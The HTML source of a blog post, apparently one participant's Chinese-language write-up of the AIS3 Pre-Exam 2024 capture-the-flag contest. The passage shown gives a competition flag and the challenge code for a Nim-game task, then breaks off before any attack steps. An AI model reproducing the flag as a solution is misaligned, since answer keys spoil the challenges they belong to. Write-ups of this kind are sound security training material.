@@ -1,0 +1,1303 @@
+<!DOCTYPE html>
+<html lang="zh-Hant-TW">
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  <link rel="preload" href="/lib/font-awesome/webfonts/fa-brands-400.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+  <link rel="preload" href="/lib/font-awesome/webfonts/fa-regular-400.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+  <link rel="preload" href="/lib/font-awesome/webfonts/fa-solid-900.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+  <link rel="preload" href="/lib/JetBrainsMono/web/woff2/JetBrainsMono-Regular.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+  <script type="text/javascript" src="https://latest.cactus.chat/cactus.js"></script>
+  <link rel="stylesheet" href="https://latest.cactus.chat/style.css" type="text/css">
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <title> 【CTF-WriteUp】AIS3 Pre-Exam 2024 | ErrorPro</title>
+  <link rel = 'canonical' href = '//localhost:1313/posts/2024/ais3_pre_exam_2024/'>
+  <meta name="description" content="我覺得現在在看這句話的人超電">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="robots" content="all,follow">
+  <meta name="googlebot" content="index,follow,snippet,archive">
+  <meta property="og:url" content="//localhost:1313/posts/2024/ais3_pre_exam_2024/">
+  <meta property="og:site_name" content="ErrorPro">
+  <meta property="og:title" content="【CTF-WriteUp】AIS3 Pre-Exam 2024">
+  <meta property="og:description" content="AIS3 Pre-Exam 2024 先放結果
+My First CTF：潛力獎
+心得 第一次參加 My First CTF 跟 AIS3 Pre-Exam，最後有幾題到比賽結束才解出來，覺得滿可惜的，
+希望下次能通靈出更多題目。
+Write Up Misc Welcome 簽到題
+FLAG: AIS3{Welc0me_to_AIS3_PreExam_2o24!}
+Quantum Nim Heist Welcome to the Quantum Nim Heist, where traditional logic intertwines with the enigmatic realm of quantum mechanics to create a Nim game like no other. 跟電腦玩 Nim 遊戲，Wiki - Nim，
+這裡的規則是拿走最後一棵石頭的人獲勝，而根據組合賽局理論，把每堆石頭數 XOR 後若為 0 則後手必勝，否則先手必勝。
+看到 server.py
+1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 def menu(): print_main_menu() choice = input(&#39;what would you like to do?">
+  <meta property="og:locale" content="zh_Hant_TW">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2024-06-11T00:00:00+08:00">
+    <meta property="article:modified_time" content="2024-06-11T00:00:00+08:00">
+    <meta property="article:tag" content="Ctf">
+
+  
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="【CTF-WriteUp】AIS3 Pre-Exam 2024">
+  <meta name="twitter:description" content="AIS3 Pre-Exam 2024 先放結果
+My First CTF：潛力獎
+心得 第一次參加 My First CTF 跟 AIS3 Pre-Exam，最後有幾題到比賽結束才解出來，覺得滿可惜的，
+希望下次能通靈出更多題目。
+Write Up Misc Welcome 簽到題
+FLAG: AIS3{Welc0me_to_AIS3_PreExam_2o24!}
+Quantum Nim Heist Welcome to the Quantum Nim Heist, where traditional logic intertwines with the enigmatic realm of quantum mechanics to create a Nim game like no other. 跟電腦玩 Nim 遊戲，Wiki - Nim，
+這裡的規則是拿走最後一棵石頭的人獲勝，而根據組合賽局理論，把每堆石頭數 XOR 後若為 0 則後手必勝，否則先手必勝。
+看到 server.py
+1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 def menu(): print_main_menu() choice = input(&#39;what would you like to do?">
+
+  
+  
+    
+  
+  
+  <link rel="stylesheet" href="//localhost:1313/css/styles.c05d68261bf086a9d7713c4f8a6215a3601608e267a816a7ee58f139b3d1aae51222aae2081c8e0c6bd35e1334773b7a16283022f31f92afd93bb37e5e822e66.css" integrity="sha512-wF1oJhvwhqnXcTxPimIVo2AWCOJnqBan7ljxObPRquUSIqriCByODGvTXhM0dzt6FigwIvMfkq/ZO7N&#43;XoIuZg=="> 
+
+  
+   <link rel="stylesheet" href="//localhost:1313/css/highlight.css">  <link rel="stylesheet" href="//localhost:1313/css/style-dark.css">  <link rel="stylesheet" href="//localhost:1313/css/search.css">  <link rel="stylesheet" href="//localhost:1313/css/cursor.css"> 
+  
+    <!--[if lt IE 9]>
+      <script src="https://oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js"></script>
+      <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
+    <![endif]-->
+  
+
+  
+<link rel="icon" type="image/png" href="//localhost:1313/images/favicon.ico" />
+
+  
+  
+</head>
+
+<body class="max-width mx-auto px3 ltr">
+  <div class="content index py4">
+
+  <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;" aria-label="Top of Page"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+        <li><a href="/">主頁</a></li>
+         
+        <li><a href="/posts">廢文區</a></li>
+         
+        <li><a href="/resources">資源</a></li>
+         
+        <li><a href="/tags">標籤</a></li>
+         
+        <li><a href="/comment">留言區</a></li>
+         
+        <li><a href="/about">關於本人</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li>
+          <a class="icon" href=" //localhost:1313/posts/2024/metasploitable3_writeup/" aria-label="Previous">
+            <i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i>
+          </a>
+        </li>
+        
+        
+        <li>
+          <a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" aria-label="Top of Page">
+            <i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i>
+          </a>
+        </li>
+        <li>
+          <a class="icon" href="#" aria-label="Share">
+            <i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i>
+          </a>
+        </li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      
+      <ul>
+  
+  
+    
+  
+  
+  <li>
+    <a class="icon" href="http://www.facebook.com/sharer.php?u=%2f%2flocalhost%3a1313%2fposts%2f2024%2fais3_pre_exam_2024%2f" aria-label="Facebook">
+      <i class="fab fa-facebook " aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="https://twitter.com/share?url=%2f%2flocalhost%3a1313%2fposts%2f2024%2fais3_pre_exam_2024%2f&text=%e3%80%90CTF-WriteUp%e3%80%91AIS3%20Pre-Exam%202024" aria-label="Twitter">
+      <i class="fab fa-twitter " aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="http://www.linkedin.com/shareArticle?url=%2f%2flocalhost%3a1313%2fposts%2f2024%2fais3_pre_exam_2024%2f&title=%e3%80%90CTF-WriteUp%e3%80%91AIS3%20Pre-Exam%202024" aria-label="Linkedin">
+      <i class="fab fa-linkedin " aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=%2f%2flocalhost%3a1313%2fposts%2f2024%2fais3_pre_exam_2024%2f&is_video=false&description=%e3%80%90CTF-WriteUp%e3%80%91AIS3%20Pre-Exam%202024" aria-label="Pinterest">
+      <i class="fab fa-pinterest " aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="mailto:?subject=%e3%80%90CTF-WriteUp%e3%80%91AIS3%20Pre-Exam%202024&body=Check out this article: %2f%2flocalhost%3a1313%2fposts%2f2024%2fais3_pre_exam_2024%2f" aria-label="Email">
+      <i class="fas fa-envelope " aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="https://getpocket.com/save?url=%2f%2flocalhost%3a1313%2fposts%2f2024%2fais3_pre_exam_2024%2f&title=%e3%80%90CTF-WriteUp%e3%80%91AIS3%20Pre-Exam%202024" aria-label="Pocket">
+      <i class="fab fa-get-pocket " aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="http://reddit.com/submit?url=%2f%2flocalhost%3a1313%2fposts%2f2024%2fais3_pre_exam_2024%2f&title=%e3%80%90CTF-WriteUp%e3%80%91AIS3%20Pre-Exam%202024" aria-label="reddit">
+      <i class="fab fa-reddit " aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="http://www.tumblr.com/share/link?url=%2f%2flocalhost%3a1313%2fposts%2f2024%2fais3_pre_exam_2024%2f&name=%e3%80%90CTF-WriteUp%e3%80%91AIS3%20Pre-Exam%202024&description=AIS3%20Pre-Exam%202024%20%e5%85%88%e6%94%be%e7%b5%90%e6%9e%9c%0aMy%20First%20CTF%ef%bc%9a%e6%bd%9b%e5%8a%9b%e7%8d%8e%0a%e5%bf%83%e5%be%97%20%e7%ac%ac%e4%b8%80%e6%ac%a1%e5%8f%83%e5%8a%a0%20My%20First%20CTF%20%e8%b7%9f%20AIS3%20Pre-Exam%ef%bc%8c%e6%9c%80%e5%be%8c%e6%9c%89%e5%b9%be%e9%a1%8c%e5%88%b0%e6%af%94%e8%b3%bd%e7%b5%90%e6%9d%9f%e6%89%8d%e8%a7%a3%e5%87%ba%e4%be%86%ef%bc%8c%e8%a6%ba%e5%be%97%e6%bb%bf%e5%8f%af%e6%83%9c%e7%9a%84%ef%bc%8c%0a%e5%b8%8c%e6%9c%9b%e4%b8%8b%e6%ac%a1%e8%83%bd%e9%80%9a%e9%9d%88%e5%87%ba%e6%9b%b4%e5%a4%9a%e9%a1%8c%e7%9b%ae%e3%80%82%0aWrite%20Up%20Misc%20Welcome%20%e7%b0%bd%e5%88%b0%e9%a1%8c%0aFLAG%3a%20AIS3%7bWelc0me_to_AIS3_PreExam_2o24%21%7d%0aQuantum%20Nim%20Heist%20Welcome%20to%20the%20Quantum%20Nim%20Heist%2c%20where%20traditional%20logic%20intertwines%20with%20the%20enigmatic%20realm%20of%20quantum%20mechanics%20to%20create%20a%20Nim%20game%20like%20no%20other.%20%e8%b7%9f%e9%9b%bb%e8%85%a6%e7%8e%a9%20Nim%20%e9%81%8a%e6%88%b2%ef%bc%8cWiki%20-%20Nim%ef%bc%8c%0a%e9%80%99%e8%a3%a1%e7%9a%84%e8%a6%8f%e5%89%87%e6%98%af%e6%8b%bf%e8%b5%b0%e6%9c%80%e5%be%8c%e4%b8%80%e6%a3%b5%e7%9f%b3%e9%a0%ad%e7%9a%84%e4%ba%ba%e7%8d%b2%e5%8b%9d%ef%bc%8c%e8%80%8c%e6%a0%b9%e6%93%9a%e7%b5%84%e5%90%88%e8%b3%bd%e5%b1%80%e7%90%86%e8%ab%96%ef%bc%8c%e6%8a%8a%e6%af%8f%e5%a0%86%e7%9f%b3%e9%a0%ad%e6%95%b8%20XOR%20%e5%be%8c%e8%8b%a5%e7%82%ba%200%20%e5%89%87%e5%be%8c%e6%89%8b%e5%bf%85%e5%8b%9d%ef%bc%8c%e5%90%a6%e5%89%87%e5%85%88%e6%89%8b%e5%bf%85%e5%8b%9d%e3%80%82%0a%e7%9c%8b%e5%88%b0%20server.py%0a1%202%203%204%205%206%207%208%209%2010%2011%2012%2013%2014%2015%2016%2017%2018%2019%2020%2021%2022%2023%2024%2025%20def%20menu%28%29%3a%20print_main_menu%28%29%20choice%20%3d%20input%28%26%2339%3bwhat%20would%20you%20like%20to%20do%3f" aria-label="Tumblr">
+      <i class="fab fa-tumblr " aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="https://news.ycombinator.com/submitlink?u=%2f%2flocalhost%3a1313%2fposts%2f2024%2fais3_pre_exam_2024%2f&t=%e3%80%90CTF-WriteUp%e3%80%91AIS3%20Pre-Exam%202024" aria-label="Hacker News">
+      <i class="fab fa-hacker-news " aria-hidden="true"></i>
+    </a>
+  </li>
+</ul>
+
+    </div>
+    
+    <div id="toc">
+      <nav id="TableOfContents">
+  <ul>
+    <li><a href="#心得">心得</a></li>
+  </ul>
+
+  <ul>
+    <li><a href="#misc">Misc</a>
+      <ul>
+        <li><a href="#welcome">Welcome</a>
+          <ul>
+            <li><a href="#flag">FLAG:</a></li>
+          </ul>
+        </li>
+        <li><a href="#quantum-nim-heist">Quantum Nim Heist</a>
+          <ul>
+            <li><a href="#flag-1">FLAG:</a></li>
+          </ul>
+        </li>
+        <li><a href="#three-dimensional-secret">Three Dimensional Secret</a>
+          <ul>
+            <li><a href="#flag-2">FLAG:</a></li>
+          </ul>
+        </li>
+        <li><a href="#emoji-console">Emoji Console</a>
+          <ul>
+            <li><a href="#flag-3">FLAG:</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+    <li><a href="#web">Web</a>
+      <ul>
+        <li><a href="#evil-calculator">Evil Calculator</a>
+          <ul>
+            <li><a href="#flag-4">FLAG:</a></li>
+          </ul>
+        </li>
+        <li><a href="#capoost">Capoost</a>
+          <ul>
+            <li><a href="#flag-5">FLAG:</a></li>
+          </ul>
+        </li>
+        <li><a href="#its-mygo">It&rsquo;s MyGO!!!!</a>
+          <ul>
+            <li><a href="#flag-6">FLAG：</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+    <li><a href="#rev">Rev</a>
+      <ul>
+        <li><a href="#the-long-print">The Long Print</a>
+          <ul>
+            <li><a href="#flag-7">FLAG:</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+    <li><a href="#pwn">Pwn</a>
+      <ul>
+        <li><a href="#mathter">Mathter</a>
+          <ul>
+            <li><a href="#flag-8">FLAG:</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+    </div>
+    
+  </span>
+</div>
+
+
+  <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+    <header>
+      <h1 class="posttitle" itemprop="name headline">
+        【CTF-WriteUp】AIS3 Pre-Exam 2024
+      </h1>
+      <div class="meta">
+        
+        <div class="postdate">
+          
+          <time datetime="2024-06-11 00:00:00 &#43;0800 CST" itemprop="datePublished">2024-06-11</time>
+          
+        </div>
+        
+        
+        
+        
+        <div class="article-tag">
+            <i class="fas fa-tag"></i>
+            
+            
+            <a class="tag-link" href="/tags/ctf" rel="tag">ctf</a>
+            
+        </div>
+        
+      </div>
+    </header>
+
+  
+    
+    <div class="content" itemprop="articleBody">
+      <h1 id="ais3-pre-exam-2024">AIS3 Pre-Exam 2024</h1>
+<p>先放結果</p>
+<p><img src="/images/ctf/ais3_pre_exam_2024/result.png" alt="result"></p>
+<p><img src="/images/ctf/ais3_pre_exam_2024/result2.png" alt="result2"></p>
+<p><img src="/images/ctf/ais3_pre_exam_2024/result3.png" alt="result3"></p>
+<p>My First CTF：潛力獎</p>
+<h2 id="心得">心得</h2>
+<p>第一次參加 My First CTF 跟 AIS3 Pre-Exam，最後有幾題到比賽結束才解出來，覺得滿可惜的，</p>
+<p>希望下次能<del>通靈</del>出更多題目。</p>
+<h1 id="write-up">Write Up</h1>
+<h2 id="misc">Misc</h2>
+<h3 id="welcome">Welcome</h3>
+<p>簽到題</p>
+<p><img src="/images/ctf/ais3_pre_exam_2024/welcome.png" alt="image"></p>
+<h4 id="flag">FLAG:</h4>
+<p>AIS3{Welc0me_to_AIS3_PreExam_2o24!}</p>
+<h3 id="quantum-nim-heist">Quantum Nim Heist</h3>
+<pre tabindex="0"><code>Welcome to the Quantum Nim Heist, where traditional logic intertwines with the enigmatic realm of quantum mechanics to create a Nim game like no other.
+</code></pre><p>跟電腦玩 Nim 遊戲，<a href="https://en.wikipedia.org/wiki/Nim">Wiki - Nim</a>，</p>
+<p>這裡的規則是拿走最後一棵石頭的人獲勝，而根據組合賽局理論，把每堆石頭數 XOR 後若為 0 則後手必勝，否則先手必勝。</p>
+<p>看到 <code>server.py</code></p>
+<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#ff79c6">def</span> <span style="color:#50fa7b">menu</span>():
+</span></span><span style="display:flex;"><span>    print_main_menu()
+</span></span><span style="display:flex;"><span>    choice <span style="color:#ff79c6">=</span> <span style="color:#8be9fd;font-style:italic">input</span>(<span style="color:#f1fa8c">&#39;what would you like to do? &#39;</span>)<span style="color:#ff79c6">.</span>strip()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">if</span> choice <span style="color:#ff79c6">==</span> <span style="color:#f1fa8c">&#39;0&#39;</span>:
+</span></span><span style="display:flex;"><span>        print_rules()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">elif</span> choice <span style="color:#ff79c6">==</span> <span style="color:#f1fa8c">&#39;1&#39;</span>:
+</span></span><span style="display:flex;"><span>        game <span style="color:#ff79c6">=</span> Game()
+</span></span><span style="display:flex;"><span>        game<span style="color:#ff79c6">.</span>generate_losing_game()
+</span></span><span style="display:flex;"><span>        play(game)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">elif</span> choice <span style="color:#ff79c6">==</span> <span style="color:#f1fa8c">&#39;2&#39;</span>:
+</span></span><span style="display:flex;"><span>        saved <span style="color:#ff79c6">=</span> <span style="color:#8be9fd;font-style:italic">input</span>(<span style="color:#f1fa8c">&#39;enter the saved game: &#39;</span>)<span style="color:#ff79c6">.</span>strip()
+</span></span><span style="display:flex;"><span>        game_str, digest <span style="color:#ff79c6">=</span> saved<span style="color:#ff79c6">.</span>split(<span style="color:#f1fa8c">&#39;:&#39;</span>)
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">if</span> <span style="color:#8be9fd;font-style:italic">hash</span><span style="color:#ff79c6">.</span>hexdigest(game_str<span style="color:#ff79c6">.</span>encode()) <span style="color:#ff79c6">==</span> digest:
+</span></span><span style="display:flex;"><span>            game <span style="color:#ff79c6">=</span> Game()
+</span></span><span style="display:flex;"><span>            game<span style="color:#ff79c6">.</span>load(game_str)
+</span></span><span style="display:flex;"><span>            play(game)
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">else</span>:
+</span></span><span style="display:flex;"><span>            print_error(<span style="color:#f1fa8c">&#39;invalid game provided!&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">elif</span> choice <span style="color:#ff79c6">==</span> <span style="color:#f1fa8c">&#39;3&#39;</span>:
+</span></span><span style="display:flex;"><span>        <span style="color:#8be9fd;font-style:italic">print</span>(<span style="color:#f1fa8c">&#39;omg bye!&#39;</span>)
+</span></span><span style="display:flex;"><span>        exit(<span style="color:#bd93f9">0</span>)
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>可以發現一定會生一個玩家必輸的局面，看看遊戲的操作選項</p>
+<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">31
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">32
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">33
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">34
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">35
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">36
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">37
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">38
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">39
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">40
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">41
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">42
